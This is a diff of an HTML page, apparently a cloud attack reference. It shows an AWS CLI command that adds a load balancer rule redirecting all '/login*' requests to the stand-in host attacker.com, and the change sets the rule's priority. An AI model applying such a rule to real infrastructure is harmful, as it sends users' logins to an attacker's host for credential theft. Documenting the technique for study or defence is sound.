@@ -366,6 +366,7 @@
           <div class="cmd-title">Create Redirect Rule</div>
           <pre><code>aws elbv2 create-rule \\
   --listener-arn &lt;arn&gt; \\
+  --priority 10 \\
   --conditions Field=path-pattern,Values='/login*' \\
   --actions Type=redirect,RedirectConfig='{
     Host=attacker.com,StatusCode=HTTP_302}'</code></pre>
